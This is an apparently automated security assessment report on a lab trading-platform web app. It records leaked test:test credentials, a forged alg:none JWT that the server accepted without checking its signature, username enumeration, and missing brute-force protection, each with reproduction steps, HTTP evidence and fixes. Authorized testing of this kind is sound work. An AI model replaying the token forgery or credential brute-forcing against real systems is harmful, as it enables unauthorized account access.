# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — secret-exposure Valid credentials disclosed in HTML source comment (test:test)](#finding-1)
    - [2. MEDIUM — session JWT auth_token signature is never verified (alg:none and forged-signature tokens accepted)](#finding-2)
    - [3. LOW — info-disclosure Username enumeration via distinct login responses](#finding-3)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [4. MEDIUM — rate-limit No rate limiting / brute-force protection on password login](#finding-4)
    - [5. LOW — vulnerable-component Outdated Bootstrap 4.5.2 — end-of-life v4 branch](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0s3e00-5hr5il` |
| Target | http://target.local:32808/ |
| Started | 2026-06-30T15:05:20.836Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 2 scanned · 1 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32808`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 2 medium, 1 low

_Plus 2 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [secret-exposure] Valid credentials disclosed in HTML source comment (test:test)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32808/

The HTML returned by GET / contains a developer comment leaking live credentials: `<!-- TODO: Delete the testing account (test:test). -->`. These credentials are valid: completing the two-step login (username=test → /password/test, then password=test) authenticates successfully, sets a signed Flask session cookie (session={"user_id":10032}) and redirects to the protected /dashboard. A wrong password is rejected ("Incorrect password"), confirming the disclosed value is the actual working password. Anyone viewing page source gains authenticated access to the trading platform.

**Reproduction**

```
1. GET http://target.local:32808/ and view source → comment reveals test:test.
2. POST username=test to / → 302 to /password/test.
3. POST username=test&user_id=10032&password=test to /password/test → 302 /dashboard with Set-Cookie session=... (authenticated).
4. Negative control: same request with password=WRONGPASS → 302 /?error=Incorrect+password (rejected).
```

**Evidence**

- Evidence `ev-mr0sbt1l-k` — `artifacts/s-0001/ev-mr0sbt1l-k/`

Request:

```http
POST /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
authorization: <redacted>

username=test&user_id=1&password=WRONGPASS
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 239
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:11:53 GMT
expires: 0
keep-alive: timeout=5, max=99
location: /?error=Incorrect+password
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?error=Incorrect+password">/?error=Incorrect+password</a>. If not, click the link.
```

- Evidence `ev-mr0sbdoi-i` — `artifacts/s-0001/ev-mr0sbdoi-i/`

Request:

```http
POST /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=test&user_id=10032&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 207
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:11:33 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /dashboard
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.
```

- Evidence `ev-mr0sbrn8-j` — `artifacts/s-0001/ev-mr0sbrn8-j/`

Request:

```http
POST /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
authorization: <redacted>

username=test&user_id=1&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 207
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:11:51 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /dashboard
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.
```

<a id="finding-2"></a>

### 2. [MEDIUM] [session] JWT auth_token signature is never verified (alg:none and forged-signature tokens accepted)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32808/

The authenticated /dashboard view reads the user's identity from the `auth_token` cookie, a JWT (HS256, and notably NOT HttpOnly / NOT Secure). The server decodes this JWT WITHOUT verifying its signature: both an `alg:none` token with an empty signature AND an `HS256` token with a garbage signature ("AAAA") were accepted and returned the authenticated dashboard (HTTP 200, "Welcome, John Doe"). A properly-verifying server (e.g. PyJWT default) rejects both. The token is decoded and its claims are used — confirmed because a forged token whose `user_id` claim did NOT match the session (`user_id=1` vs session `user_id=10032`) was rejected with HTTP 400 "Authentication Token has an invalid UserID", proving the endpoint genuinely parses and trusts the (unsigned) claims rather than blanket-allowing.

Impact is bounded by a second control: the dashboard cross-checks `jwt.user_id == session.user_id`. The Flask `session` cookie is signed with the server SECRET_KEY (not forgeable here), so a forged unsigned auth_token alone cannot impersonate another user_id — that would additionally require forging the signed Flask session. The confirmed defect is therefore the COMPLETE ABSENCE of JWT signature verification: any non-user_id claim (username, name, and any role/privilege claim the app might later trust) can be forged at will, and the design is one missing check (or a SECRET_KEY leak) away from full cross-user account takeover. The non-HttpOnly flag compounds this (any XSS trivially exfiltrates the token).

**Reproduction**

```
1. Log in legitimately as test:test (POST / username=test → POST /password/test password=test) to obtain a valid signed Flask `session` cookie for user_id 10032.
2. Forge an UNSIGNED auth_token. alg:none variant: header {"alg":"none","typ":"JWT"} + payload {"username":"test","user_id":10032,"name":"John Doe"} + empty signature → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwibmFtZSI6IkpvaG4gRG9lIn0.`
3. GET /dashboard with Cookie: session=<valid>; auth_token=<forged> → HTTP 200, "Welcome, John Doe" (ev-mr0sxzia-1k).
4. Repeat with a tampered `name` claim (ev-mr0sy1e8-1l) and with an HS256 header + garbage signature "AAAA" (ev-mr0t1kcz-1o) → both still HTTP 200. The signature is irrelevant.
5. Negative control: same forged token but user_id=1 (mismatching the session's 10032) → HTTP 400 "Authentication Token has an invalid UserID" (ev-mr0szhwc-1n), confirming the server decodes/uses the unsigned claims rather than returning a catch-all 200.

Fix: verify the JWT signature (jwt.decode with the secret and an explicit algorithms=["HS256"] allowlist, reject alg:none), set HttpOnly+Secure on auth_token, and avoid trusting two parallel identity sources.
```

**Evidence**

- Evidence `ev-mr0szhwc-1n` — `artifacts/_/ev-mr0szhwc-1n/`

Request:

```http
GET /dashboard HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 400
cache-control: public, max-age=0
connection: close
content-length: 43
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:30:18 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie

Authentication Token has an invalid UserID.
```

- Evidence `ev-mr0sxzia-1k` — `artifacts/_/ev-mr0sxzia-1k/`

Request:

```http
GET /dashboard HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1847
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:29:08 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Trading Platform</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #2c3e50;
            color: #ffffff;
        }
        .card {
            background-color: #34495e;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">Trading Platform</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <form action="/logout" method="post">
                            <button type="submit" class="btn btn-success">Logout</button>
                        </form>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-3">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2 class="text-center mb-4">Dashboard</h2>
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Welcome, John Doe</h5>
                        <p class="card-text">This is your dashboard.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mr0sy1e8-1l` — `artifacts/_/ev-mr0sy1e8-1l/`

Request:

```http
GET /dashboard HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1847
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:29:10 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Trading Platform</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #2c3e50;
            color: #ffffff;
        }
        .card {
            background-color: #34495e;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">Trading Platform</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <form action="/logout" method="post">
                            <button type="submit" class="btn btn-success">Logout</button>
                        </form>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-3">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2 class="text-center mb-4">Dashboard</h2>
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Welcome, John Doe</h5>
                        <p class="card-text">This is your dashboard.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mr0t1kcz-1o` — `artifacts/_/ev-mr0t1kcz-1o/`

Request:

```http
GET /dashboard HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1847
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:31:55 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Trading Platform</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #2c3e50;
            color: #ffffff;
        }
        .card {
            background-color: #34495e;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">Trading Platform</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <form action="/logout" method="post">
                            <button type="submit" class="btn btn-success">Logout</button>
                        </form>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-3">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2 class="text-center mb-4">Dashboard</h2>
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Welcome, John Doe</h5>
                        <p class="card-text">This is your dashboard.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [info-disclosure] Username enumeration via distinct login responses

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32808/

The login flow reveals whether a username exists. A valid username (test) returns HTTP 200 with the password form and a personalized greeting ("Welcome, John!"), while a non-existent username returns HTTP 302 redirect to /?error=User+not+found. This lets an attacker enumerate valid accounts. The personalized greeting additionally discloses the account holder's real name, and the password page exposes the internal user_id (10032) in a hidden field.

**Reproduction**

```
1. GET http://target.local:32808/password/test → 200, body contains "Welcome, John!" and hidden user_id=10032 (valid user).
2. GET http://target.local:32808/password/zzdoesnotexistzz → 302 to /?error=User+not+found (invalid user).
3. Differing status/body distinguishes valid from invalid usernames.
```

**Evidence**

- Evidence `ev-mr0s9cd9-7` — `artifacts/s-0001/ev-mr0s9cd9-7/`

Request:

```http
GET /password/zzdoesnotexistzz HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 231
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:09:58 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /?error=User+not+found
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?error=User+not+found">/?error=User+not+found</a>. If not, click the link.
```

- Evidence `ev-mr0s8vzi-6` — `artifacts/s-0001/ev-mr0s8vzi-6/`

Request:

```http
GET /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1418
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:09:37 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password - Trading Platform</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #2c3e50;
            color: #ffffff;
        }
        .card {
            background-color: #34495e;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2 class="text-center mb-4">Trading Platform</h2>
                <form method="POST">
                    <div class="form-group">
                        <p class="mt-3 text-center">Welcome, John!</p>
                        <label for="password">Password</label>
                        <input type="text" class="form-control" id="username" name="username" value="test" hidden>
                        <input type="text" class="form-control" id="user_id" name="user_id" value="10032" hidden>
                        <input type="password" class="form-control" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn btn-success btn-block">Login</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mr0sdipp-p` — `artifacts/s-0001/ev-mr0sdipp-p/`

Request:

```http
GET /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1418
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:13:13 GMT
expires: 0
keep-alive: timeout=5, max=96
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password - Trading Platform</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #2c3e50;
            color: #ffffff;
        }
        .card {
            background-color: #34495e;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2 class="text-center mb-4">Trading Platform</h2>
                <form method="POST">
                    <div class="form-group">
                        <p class="mt-3 text-center">Welcome, John!</p>
                        <label for="password">Password</label>
                        <input type="text" class="form-control" id="username" name="username" value="test" hidden>
                        <input type="text" class="form-control" id="user_id" name="user_id" value="10032" hidden>
                        <input type="password" class="form-control" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn btn-success btn-block">Login</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-4"></a>

### 4. [SUSPECTED] [MEDIUM] [rate-limit] No rate limiting / brute-force protection on password login

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32808/

**Anomaly (why this is a lead):** Six consecutive wrong-password POSTs to /password/test (passwords brute1..brute6) were all processed and returned identical 302 "Incorrect password" responses with no HTTP 429, account lockout, throttling delay, or CAPTCHA. The password-verification endpoint has no brute-force protection; combined with the confirmed username-enumeration vector, this permits credential brute-forcing at full request speed.

The password step (/password/{username}) enforces no rate limiting. Repeated incorrect-password submissions are accepted indefinitely without throttling or lockout, enabling offline-speed online brute force of account passwords.

**Reproduction**

```
POST username=test&user_id=10032&password=brute1..brute6 to /password/test in rapid succession → all six return 302 /?error=Incorrect+password (evidence ev-mr0sdw8j-q, ev-mr0sdxre-r, ev-mr0sdyt1-s, ev-mr0sdzw3-t, ev-mr0se1av-u, ev-mr0se24u-v). No 429/lockout/CAPTCHA observed.
```

**Evidence**

- Evidence `ev-mr0se24u-v` — `artifacts/s-0001/ev-mr0se24u-v/`

Request:

```http
POST /password/test HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
authorization: <redacted>

username=test&user_id=10032&password=brute6
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 239
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:13:38 GMT
expires: 0
keep-alive: timeout=5, max=95
location: /?error=Incorrect+password
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?error=Incorrect+password">/?error=Incorrect+password</a>. If not, click the link.
```

<a id="finding-5"></a>

### 5. [SUSPECTED] [LOW] [vulnerable-component] Outdated Bootstrap 4.5.2 — end-of-life v4 branch

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32808/

**Anomaly (why this is a lead):** Bootstrap v4.5.2 detected via the version banner comment at the top of /static/css/bootstrap.min.css. Bootstrap 4 is end-of-life — the final v4 release was 4.6.2 (July 2022) and the v4 branch no longer receives security fixes — and 4.5.2 lags even that last v4. No confirmed-applicable High/Critical CVE: the headline tooltip/popover XSS CVE-2019-8331 was fixed in 4.3.1, before this version. This is an outdated/EOL client-side dependency, version-based, not exploited.

The login page loads Bootstrap v4.5.2 (CSS banner in /static/css/bootstrap.min.css). Bootstrap 4.x is end-of-life: 4.6.2 (July 2022) was the final v4 release and the branch is no longer maintained, so any future client-side XSS/DOM issue in v4 will go unpatched. 4.5.2 is also behind that last v4 point release. The well-known v4 XSS (CVE-2019-8331, data-template/data-content in tooltip & popover) was already remediated in 4.3.1, so it does NOT apply here — there is no confirmed High/Critical CVE against 4.5.2 specifically. Severity is low: this is a version-based / EOL hygiene lead, not a demonstrated exploit. Recommendation: upgrade to a maintained Bootstrap release (current v5.x) to stay on a supported, patched branch.

**Reproduction**

```
GET http://target.local:32808/static/css/bootstrap.min.css and read the header comment: "/*! Bootstrap v4.5.2 (https://getbootstrap.com/) ... Copyright 2011-2020 */". Cross-reference 4.5.2 against the Bootstrap release timeline (final v4 = 4.6.2, July 2022; v4 EOL).
```

**Evidence**

- Evidence `ev-mr0t5yey-1x` — `artifacts/_/ev-mr0t5yey-1x/`

Request:

```http
GET /static/css/bootstrap.min.css HTTP/1.1
Host: target.local:32808
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
accept-ranges: bytes
cache-control: public, max-age=0
connection: Keep-Alive
content-disposition: inline; filename=bootstrap.min.css
content-length: 160302
content-type: text/css; charset=utf-8
date: Tue, 30 Jun 2026 15:35:19 GMT
etag: "1782574704.0-160302-1662459261-gzip"
expires: 0
keep-alive: timeout=5, max=100
last-modified: Sat, 27 Jun 2026 15:38:24 GMT
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

/*!
 * Bootstrap v4.5.2 (https://getbootstrap.com/)
 * Copyright 2011-2020 The Bootstrap Authors
 * Copyright 2011-2020 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 */:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}article,aside,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}[tabindex="-1"]:focus:not(:focus-visible){outline:0!important}hr{box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0;-webkit-text-decoration-skip-ink:none;text-decoration-skip-ink:none}address{margin-bottom:1rem;font-style:normal;line-height:inherit}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#007bff;text-decoration:none;background-color:transparent}a:hover{color:#0056b3;text-decoration:underline}a:not([href]):not([class]){color:inherit;text-decoration:none}a:not([href]):not([class]):hover{color:inherit;text-decoration:none}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-size:1em}pre{margin-top:0;margin-bottom:1rem;overflow:auto;-ms-overflow-style:scrollbar}figure{margin:0 0 1rem}img{vertical-align:middle;border-style:none}svg{overflow:hidden;vertical-align:middle}table{border-collapse:collapse}caption{padding-top:.75rem;padding-bottom:.75rem;color:#6c757d;text-align:left;caption-side:bottom}th{text-align:inherit}label{display:inline-block;margin-bottom:.5rem}button{border-radius:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,input{overflow:visible}button,select{text-transform:none}[role=button]{cursor:pointer}select{word-wrap:normal}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]:not(:disabled),[type=reset]:not(:disabled),[type=submit]:not(:disabled),button:not(:disabled){cursor:pointer}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5rem;font-size:1.5rem;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item;cursor:pointer}template{display:none}[hidden]{display:none!important}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-bottom:.5rem;font-weight:500;line-height:1.2}.h1,h1{font-size:2.5rem}.h2,h2{font-size:2rem}.h3,h3{font-size:1.75rem}.h4,h4{font-size:1.5rem}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:6rem;font-weight:300;line-height:1.2}.display-2{font-size:5.5rem;font-weight:300;line-height:1.2}.display-3{font-size:4.5rem;font-weight:300;line-height:1.2}.display-4{font-size:3.5rem;font-weight:300;line-height:1.2}hr{margin-top:1rem;margin-bottom:1rem;border:0;border-top:1px solid rgba(0,0,0,.1)}.small,small{font-size:80%;font-weight:400}.mark,mark{padding:.2em;background-color:#fcf8e3}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:90%;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote-footer{display:block;font-size:80%;color:#6c757d}.blockquote-footer::before{content:"\2014\00A0"}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:#fff;border:1px solid #dee2e6;border-radius:.25rem;max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:90%;color:#6c757d}code{font-size:87.5%;color:#e83e8c;word-wrap:break-word}a>code{color:inherit}kbd{padding:.2rem .4rem;font-size:87.5%;color:#fff;background-color:#212529;border-radius:.2rem}kbd kbd{padding:0;font-size:100%;font-weight:700}pre{display:block;font-size:87.5%;color:#212529}pre code{font-size:inherit;color:inherit;word-break:normal}.pre-scrollable{max-height:340px;overflow-y:scroll}.container,.container-fluid,.container-lg,.container-md,.container-sm,.container-xl{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container,.container-sm{max-width:540px}}@media (min-width:768px){.container,.container-md,.container-sm{max-width:720px}}@media (min-width:992px){.container,.container-lg,.container-md,.container-sm{max-width:960px}}@media 